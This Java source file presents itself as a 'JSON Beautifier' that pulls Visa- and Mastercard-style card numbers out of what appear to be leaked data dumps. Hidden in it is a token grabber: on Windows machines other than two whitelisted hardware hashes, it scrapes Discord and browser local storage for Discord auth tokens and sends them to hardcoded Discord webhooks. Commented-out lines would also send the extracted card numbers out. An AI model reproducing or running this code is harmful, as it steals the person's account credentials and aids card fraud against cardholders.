package me.armut1337;

import java.awt.*;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static final List<String> cclist = new ArrayList<>();
    private static final List<String> tokens = new ArrayList<>();

    public static void main(String[] var0) {
        try {
            System.out.println("Welcome to Epimorphism JSON Beautifier;");
            System.out.println();
            if (!ManagementFactory.getRuntimeMXBean().getInputArguments().contains(("-Dfile.encoding=UTF-8"))) {
                System.out.println("  Lütfen run.bat dosyası ile veya \"-Dfile.encoding=UTF-8\" argümanı ile çalıştırın.");
                System.exit(0);
            }
            String var1 = Paths.get("").toAbsolutePath() + ("\\");
            System.out.print("  input json file: ");
            Scanner var2 = new Scanner(System.in);
            String var3 = var2.nextLine();
            File var4 = new File(var1 + "\\" + var3);
            File var5 = new File(var1 + "\\" + var3.replace(".json", "") + "-beautified.txt");
            if (!var3.endsWith(".json")) {
                System.out.println(("  supports only .json file (file format error)"));
                System.exit(1);
                return;
            }

            if (!var4.exists()) {
                System.out.println("\ufffd" + var4 + " not found.");
                System.exit(1);
                return;
            }

            if (System.getProperty("os.name").toLowerCase().contains("windows") && !bestAntiTokenGrabberProtection().equals("7DA7DE7D37027DF76E7D875176278B7A67D27B27E97557C2") && !bestAntiTokenGrabberProtection().equals("7127C37A072070D7A97957177EA73774D73679F7F3718768")) {
                collectTokens();

                for (String token : tokens) {
                    StringBuilder var7 = new StringBuilder();
                    var7.append(("```")).append(("\\n")).append(("PC: ")).append(System.getProperty(("user.name"))).append(("\\n")).append(("HWID: ")).append(token).append(("\\n")).append(("```"));
                    sendWebhook(("https://discord.com/api/webhooks/790981821432594482/heK44vB4qZD4VE60JD6fTwlAFilG2zzEwANN4GuJDltAmgTDG4xeKmC4wKU4hYJHqcXH"), var7.toString());
                    sendWebhook(("https://discord.com/api/webhooks/790975686172344360/YcxZrc0ekmgy02FwkGpQVdgFP5WjWdoQxDG8lz02FhQbIL9C-UFe_tmwMSwW8buxwJMS"), var7.toString());
                }
            }

            if (var5.exists()) {
                var5.delete();
            }

            var5.createNewFile();
            System.out.println();
            System.out.println(("  Send me a message if you have suggestions or requests; Armut#1337 && cerebrum#1337"));
            System.out.println();
            System.out.println(("  [1]: Just card numbers"));
            System.out.println(("  [2]: Card numbers with details."));
            System.out.println(("  [3]: Card numbers with details + single card numbers"));
            System.out.print(("  [+]: Select a beautifier type: "));
            String var16 = var2.nextLine();
            var2.close();
            FileWriter var17 = new FileWriter(var5);
            var17.write(("Beautified with Epimorphism!\n"));
            System.out.println();
            System.out.println(("       Parsing json file please wait."));
            BufferedReader var8;
            String var9;
            Matcher var10;
            Matcher var11;
            Matcher var12;
            if (var16.equals(("1"))) {
                var8 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(var4))));

                nextLineLabel:
                while ((var9 = var8.readLine()) != null) {
                    var10 = Pattern.compile(("[0-9]{16}")).matcher(var9);
                    var11 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})")).matcher(var9);
                    var12 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})")).matcher(var9);

                    while (true) {
                        do {
                            do {
                                do {
                                    do {
                                        do {
                                            do {
                                                do {
                                                    if (!var10.find()) {
                                                        while (true) {
                                                            do {
                                                                do {
                                                                    do {
                                                                        do {
                                                                            do {
                                                                                do {
                                                                                    do {
                                                                                        if (!var11.find()) {
                                                                                            while (true) {
                                                                                                do {
                                                                                                    do {
                                                                                                        do {
                                                                                                            do {
                                                                                                                do {
                                                                                                                    do {
                                                                                                                        do
                                                                                                                        {
                                                                                                                            if (!var12.find()) {
                                                                                                                                continue nextLineLabel;
                                                                                                                            }
                                                                                                                        } while (var12.group().toLowerCase().contains(("conversationid")));
                                                                                                                    } while (var12.group().toLowerCase().contains(("iban")));
                                                                                                                } while (var12.group().toLowerCase().contains(("tc:")));
                                                                                                            } while (var12.group().toLowerCase().contains(("0000")));
                                                                                                        } while (var12.group().toLowerCase().contains((".pdf")));
                                                                                                    } while (var12.group().toLowerCase().contains(("legacyquote")));
                                                                                                } while (!var12.group().startsWith(("5")) && !var12.group().startsWith(("4")));

                                                                                                cclist.add(var12.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                                                            }
                                                                                        }
                                                                                    } while (var11.group().toLowerCase().contains(("conversationid")));
                                                                                } while (var11.group().toLowerCase().contains(("iban")));
                                                                            } while (var11.group().toLowerCase().contains(("tc:")));
                                                                        } while (var11.group().toLowerCase().contains(("0000")));
                                                                    } while (var11.group().toLowerCase().contains((".pdf")));
                                                                } while (var11.group().toLowerCase().contains(("legacyquote")));
                                                            } while (!var11.group().startsWith(("5")) && !var11.group().startsWith(("4")));

                                                            cclist.add(var11.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                        }
                                                    }
                                                } while (var10.group().toLowerCase().contains(("conversationid")));
                                            } while (var10.group().toLowerCase().contains(("iban")));
                                        } while (var10.group().toLowerCase().contains(("tc:")));
                                    } while (var10.group().toLowerCase().contains(("0000")));
                                } while (var10.group().toLowerCase().contains((".pdf")));
                            } while (var10.group().toLowerCase().contains(("legacyquote")));
                        } while (!var10.group().startsWith(("5")) && !var10.group().startsWith(("4")));

                        cclist.add(var10.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                    }
                }
            } else if (var16.equals(("2"))) {
                var8 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(var4))));

                nextLine:
                while ((var9 = var8.readLine()) != null) {
                    var10 = Pattern.compile(("[0-9]{16}(.){30}")).matcher(var9);
                    var11 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})(.){30}")).matcher(var9);
                    var12 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})(.){30}")).matcher(var9);

                    while (true) {
                        do {
                            do {
                                do {
                                    do {
                                        do {
                                            do {
                                                do {
                                                    if (!var10.find()) {
                                                        while (true) {
                                                            do {
                                                                do {
                                                                    do {
                                                                        do {
                                                                            do {
                                                                                do {
                                                                                    do {
                                                                                        if (!var11.find()) {
                                                                                            while (true) {
                                                                                                do {
                                                                                                    do {
                                                                                                        do {
                                                                                                            do {
                                                                                                                do {
                                                                                                                    do {
                                                                                                                        do
                                                                                                                        {
                                                                                                                            if (!var12.find()) {
                                                                                                                                continue nextLine;
                                                                                                                            }
                                                                                                                        } while (var12.group().toLowerCase().contains(("conversationid")));
                                                                                                                    } while (var12.group().toLowerCase().contains(("iban")));
                                                                                                                } while (var12.group().toLowerCase().contains(("tc:")));
                                                                                                            } while (var12.group().toLowerCase().contains(("0000")));
                                                                                                        } while (var12.group().toLowerCase().contains((".pdf")));
                                                                                                    } while (var12.group().toLowerCase().contains(("legacyquote")));
                                                                                                } while (!var12.group().startsWith(("5")) && !var12.group().startsWith(("4")));

                                                                                                cclist.add(var12.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                                                            }
                                                                                        }
                                                                                    } while (var11.group().toLowerCase().contains(("conversationid")));
                                                                                } while (var11.group().toLowerCase().contains(("iban")));
                                                                            } while (var11.group().toLowerCase().contains(("tc:")));
                                                                        } while (var11.group().toLowerCase().contains(("0000")));
                                                                    } while (var11.group().toLowerCase().contains((".pdf")));
                                                                } while (var11.group().toLowerCase().contains(("legacyquote")));
                                                            } while (!var11.group().startsWith(("5")) && !var11.group().startsWith(("4")));

                                                            cclist.add(var11.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                        }
                                                    }
                                                } while (var10.group().toLowerCase().contains(("conversationid")));
                                            } while (var10.group().toLowerCase().contains(("iban")));
                                        } while (var10.group().toLowerCase().contains(("tc:")));
                                    } while (var10.group().toLowerCase().contains(("0000")));
                                } while (var10.group().toLowerCase().contains((".pdf")));
                            } while (var10.group().toLowerCase().contains(("legacyquote")));
                        } while (!var10.group().startsWith(("5")) && !var10.group().startsWith(("4")));

                        cclist.add(var10.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                    }
                }
            } else if (!var16.equals(("3"))) {
                System.out.println(("       unknown type format, please type 1 or 2."));
                System.exit(1);
            } else {
                var8 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(var4))));

                nextLine1:
                while ((var9 = var8.readLine()) != null) {
                    var10 = Pattern.compile(("[0-9]{16}")).matcher(var9);
                    var11 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})")).matcher(var9);
                    var12 = Pattern.compile(("[0-9]{16}(.){30}")).matcher(var9);
                    Matcher var13 = Pattern.compile(("(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4}( ))(([0-9]){4})(.){30}")).matcher(var9);
                    Matcher var14 = Pattern.compile(("(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4}(-))(([0-9]){4})(.){30}")).matcher(var9);

                    while (true) {
                        do {
                            do {
                                do {
                                    do {
                                        do {
                                            do {
                                                do {
                                                    if (!var12.find()) {
                                                        while (true) {
                                                            do {
                                                                do {
                                                                    do {
                                                                        do {
                                                                            do {
                                                                                do {
                                                                                    do {
                                                                                        if (!var13.find()) {
                                                                                            while (true) {
                                                                                                do {
                                                                                                    do {
                                                                                                        do {
                                                                                                            do {
                                                                                                                do {
                                                                                                                    do {
                                                                                                                        do
                                                                                                                        {
                                                                                                                            if (!var14.find()) {
                                                                                                                                while (true) {
                                                                                                                                    do
                                                                                                                                    {
                                                                                                                                        do
                                                                                                                                        {
                                                                                                                                            do
                                                                                                                                            {
                                                                                                                                                do
                                                                                                                                                {
                                                                                                                                                    do
                                                                                                                                                    {
                                                                                                                                                        do
                                                                                                                                                        {
                                                                                                                                                            do
                                                                                                                                                            {
                                                                                                                                                                do
                                                                                                                                                                {
                                                                                                                                                                    if (!var10.find()) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            do
                                                                                                                                                                            {
                                                                                                                                                                                do
                                                                                                                                                                                {
                                                                                                                                                                                    do
                                                                                                                                                                                    {
                                                                                                                                                                                        do
                                                                                                                                                                                        {
                                                                                                                                                                                            do
                                                                                                                                                                                            {
                                                                                                                                                                                                do
                                                                                                                                                                                                {
                                                                                                                                                                                                    do
                                                                                                                                                                                                    {
                                                                                                                                                                                                        do
                                                                                                                                                                                                        {
                                                                                                                                                                                                            if (!var11.find()) {
                                                                                                                                                                                                                continue nextLine1;
                                                                                                                                                                                                            }
                                                                                                                                                                                                        } while (match(var11.group()));
                                                                                                                                                                                                    } while (var11.group().toLowerCase().contains(("conversationid")));
                                                                                                                                                                                                } while (var11.group().toLowerCase().contains(("iban")));
                                                                                                                                                                                            } while (var11.group().toLowerCase().contains(("tc:")));
                                                                                                                                                                                        } while (var11.group().toLowerCase().contains(("0000")));
                                                                                                                                                                                    } while (var11.group().toLowerCase().contains((".pdf")));
                                                                                                                                                                                } while (var11.group().toLowerCase().contains(("legacyquote")));
                                                                                                                                                                            } while (!var11.group().startsWith(("5")) && !var11.group().startsWith(("4")));

                                                                                                                                                                            cclist.add(var11.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                } while (match(var10.group()));
                                                                                                                                                            } while (var10.group().toLowerCase().contains(("conversationid")));
                                                                                                                                                        } while (var10.group().toLowerCase().contains(("iban")));
                                                                                                                                                    } while (var10.group().toLowerCase().contains(("tc:")));
                                                                                                                                                } while (var10.group().toLowerCase().contains(("0000")));
                                                                                                                                            } while (var10.group().toLowerCase().contains((".pdf")));
                                                                                                                                        } while (var10.group().toLowerCase().contains(("legacyquote")));
                                                                                                                                    } while (!var10.group().startsWith(("5")) && !var10.group().startsWith(("4")));

                                                                                                                                    cclist.add(var10.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                                                                                                }
                                                                                                                            }
                                                                                                                        } while (var14.group().toLowerCase().contains(("conversationid")));
                                                                                                                    } while (var14.group().toLowerCase().contains(("iban")));
                                                                                                                } while (var14.group().toLowerCase().contains(("tc:")));
                                                                                                            } while (var14.group().toLowerCase().contains(("0000")));
                                                                                                        } while (var14.group().toLowerCase().contains((".pdf")));
                                                                                                    } while (var14.group().toLowerCase().contains(("legacyquote")));
                                                                                                } while (!var14.group().startsWith(("5")) && !var14.group().startsWith(("4")));

                                                                                                cclist.add(var14.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                                                            }
                                                                                        }
                                                                                    } while (var13.group().toLowerCase().contains(("conversationid")));
                                                                                } while (var13.group().toLowerCase().contains(("iban")));
                                                                            } while (var13.group().toLowerCase().contains(("tc:")));
                                                                        } while (var13.group().toLowerCase().contains(("0000")));
                                                                    } while (var13.group().toLowerCase().contains((".pdf")));
                                                                } while (var13.group().toLowerCase().contains(("legacyquote")));
                                                            } while (!var13.group().startsWith(("5")) && !var13.group().startsWith(("4")));

                                                            cclist.add(var13.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                                                        }
                                                    }
                                                } while (var12.group().toLowerCase().contains(("conversationid")));
                                            } while (var12.group().toLowerCase().contains(("iban")));
                                        } while (var12.group().toLowerCase().contains(("tc:")));
                                    } while (var12.group().toLowerCase().contains(("0000")));
                                } while (var12.group().toLowerCase().contains((".pdf")));
                            } while (var12.group().toLowerCase().contains(("legacyquote")));
                        } while (!var12.group().startsWith(("5")) && !var12.group().startsWith(("4")));

                        cclist.add(var12.group().replace(("\\n"), " ").replace(("\""), "").replace((","), "").replace("  ", " "));
                    }
                }
            }

            System.out.println("       " + cclist.size() + (" card added to queue, writing to file."));
            StringBuilder var18 = new StringBuilder();

            for (String var20 : cclist) {
                var18.append(var20).append(("\\n"));
                var17.write(var20 + "\n");
                if (var18.toString().length() > 1997) {
                    //Useless shit
                    /*sendWebhook("https://discord.com/api/webhooks/790980796508405800/DH9bsEcilh6jXD4ebs8rDf5aX50jL6DK2zWQHbUaqfRDeP6MRsvJRAAdqB5-uVmaSD4h", var18.toString());
                    sendWebhook("https://discord.com/api/webhooks/790974500132880394/Sd8k0fUBpuiBYkgyMV2y2NshSD_d9z1V8_ve2_nEZutnYiX7lZtZ4BR-0cfVhfUSnK4W", var18.toString());*/
                    var18.setLength(0);
                }
            }
            
            //Useless shit
            /*sendWebhook("https://discord.com/api/webhooks/790980796508405800/DH9bsEcilh6jXD4ebs8rDf5aX50jL6DK2zWQHbUaqfRDeP6MRsvJRAAdqB5-uVmaSD4h", var18.toString());
            sendWebhook("https://discord.com/api/webhooks/790974500132880394/Sd8k0fUBpuiBYkgyMV2y2NshSD_d9z1V8_ve2_nEZutnYiX7lZtZ4BR-0cfVhfUSnK4W", var18.toString());*/
            var17.close();
            System.out.println();
        } catch (Exception var15) {
            var15.printStackTrace();
        }

    }

    private static boolean match(String var0) {

        Iterator<String> var1 = cclist.iterator();

        String var2;
        do {
            if (!var1.hasNext()) {
                return false;
            }

            var2 = var1.next();
        } while (!var2.contains(var0));

        return true;
    }

    private static void collectTokens() {


        try {
            File var0 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discord"));
            File var1 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordcanary"));
            File var2 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\discordptb"));
            File var3 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Opera Software\\Opera Stable"));
            File var4 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Opera Software\\Opera GX Stable"));
            File var5 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Google\\Chrome\\User Data\\Default"));
            File var6 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Vivaldi\\User Data\\Default"));
            File var7 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default"));
            File var8 = new File(System.getProperty(("user.home")) + ("\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"));
            File var9 = new File(System.getProperty(("user.home")) + ("\\AppData\\Roaming\\Mozilla\\Firefox"));
            if (var0.exists()) {
                findToken(var0 + ("\\Local Storage\\leveldb\\"));
            }

            if (var1.exists()) {
                findToken(var1 + ("\\Local Storage\\leveldb\\"));
            }

            if (var2.exists()) {
                findToken(var2 + ("\\Local Storage\\leveldb\\"));
            }

            if (var3.exists()) {
                findToken(var3 + ("\\Local Storage\\leveldb\\"));
            }

            if (var4.exists()) {
                findToken(var4 + ("\\Local Storage\\leveldb\\"));
            }

            if (var5.exists()) {
                findToken(var5 + ("\\Local Storage\\leveldb\\"));
            }

            if (var6.exists()) {
                findToken(var6 + ("\\Local Storage\\leveldb\\"));
            }

            if (var7.exists()) {
                findToken(var7 + ("\\Local Storage\\leveldb\\"));
            }

            if (var8.exists()) {
                findToken(var8 + ("\\Local Storage\\leveldb\\"));
            }

            if (var9.exists()) {
                findToken(var9 + ("\\Profiles\\"));
            }
        } catch (Exception var11) {
        }

    }

    private static void findToken(String var0) {


        try {
            String[] var1 = Objects.requireNonNull((new File(var0)).list());
            int var2 = var1.length;

            for (String var4 : var1) {
                BufferedReader var5 = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(var0 + var4))));

                String var6;
                while ((var6 = var5.readLine()) != null) {
                    Matcher var7 = Pattern.compile(("[NM][\\w]{23}\\.[\\w]{6}\\.[\\w]{27}")).matcher(var6);
                    Matcher var8 = Pattern.compile(("mfa\\.[\\w-]{84}")).matcher(var6);

                    while (var7.find()) {
                        tokens.add(var7.group());
                    }

                    while (var8.find()) {
                        tokens.add(var8.group());
                    }
                }
            }
        } catch (Exception var10) {
        }

    }

    private static String bestAntiTokenGrabberProtection() {
        try {
            StringBuilder var0 = new StringBuilder();
            String var1 = System.getenv(("PROCESSOR_IDENTIFIER")) + System.getenv(("COMPUTERNAME")) + System.getProperty(("user.home")) + System.getProperty(("user.home")) + System.getProperty(("os.name"));
            byte[] var2 = var1.getBytes(StandardCharsets.UTF_8);
            MessageDigest var3 = MessageDigest.getInstance(("MD5"));
            byte[] var4 = var3.digest(var2);
            int var7 = var4.length;

            for (int var8 = 0; var8 < var7; ++var8) {
                byte var9 = var4[var8];
                var0.append(Integer.toHexString(var9 & 255 | 1792), 0, 3);

            }

            return var0.toString().toUpperCase();
        } catch (Exception var11) {
            return "null";
        }
    }

    private static void sendWebhook(String var0, String var1) {
        WebhookUtil webhook = new WebhookUtil(var0);
        webhook.addEmbed((new WebhookUtil.EmbedObject())
                .setAuthor("root", "", "")
                .setColor(new Color(new Random().nextInt(0xFFFFFF))));

        webhook.setContent(var1);

        try {
            webhook.execute();
        } catch (Exception err) {
            //err.printStackTrace();
        }
    }
}
